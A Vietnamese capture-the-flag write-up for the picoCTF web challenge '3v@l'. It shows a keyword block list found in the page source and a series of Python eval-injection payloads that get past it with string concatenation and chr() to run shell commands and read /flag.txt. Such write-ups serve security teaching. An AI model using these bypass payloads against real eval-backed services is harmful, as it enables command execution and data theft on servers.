# 3v@l

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image295.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image296.png?raw=true)

Dựa vào gợi ý hiển thị từ box, tôi đã thử nhập `PRT*RATE*TIME(10000*23*12)` và click `Execute`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image297.png?raw=true)

=> Thông báo lỗi `name 'PRT' is not defined`. Tiếp theo tôi thử nhập:

    <script>alert("1")</script>

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image298.png?raw=true)

=> Thông báo lỗi `Detected forbidden keyword ''`.

Thử xem source code:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image299.png?raw=true)

Dựa vào source code, tôi biết rằng website sử dụng python ở phía back-end, với đoạn chú thích:

    <!--
        TODO
        ------------
        Secure python_flask eval execution by 
            1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
            2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
    -->

Tôi sẽ thử nhập payload để xem biện pháp bảo vệ `python_flask eval execution` có hoạt động không:

    __import__('os').popen('ls').read()

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image300.png?raw=true)

=> Như vậy, tôi cần tìm cách bypass qua bộ lọc này. Tôi thử nhập payload sau:

    __import__('o'+'s').popen('l' + 's').read()

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image301.png?raw=true)

=> Website đã liệt kê ra `app.py`, `static` và `templates`. Tiếp theo, tôi muốn thử liệt kê ra xem những gì có trong thư mục `/`: 

    __import__('o'+'s').popen('l' + 's' + ' /').read()

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image302.png?raw=true)

=> Có vẻ website đã lọc cả ký tự `/`. Ý tưởng tiếp theo của tôi là tôi thử sử dụng hàm `chr()` để ánh xạ sang ký tự `/`:

    __import__('o'+'s').popen('l' + 's ' + chr(47)).read()

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image303.png?raw=true)

=> Thành công tìm ra file `flag.txt`. Payload cuối cùng của tôi sẽ là: 

    __import__('o'+'s').popen('c' + 'at ' + chr(47) + 'fl' + 'ag' + chr(46) + 't' + 'xt').read()

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image304.png?raw=true)





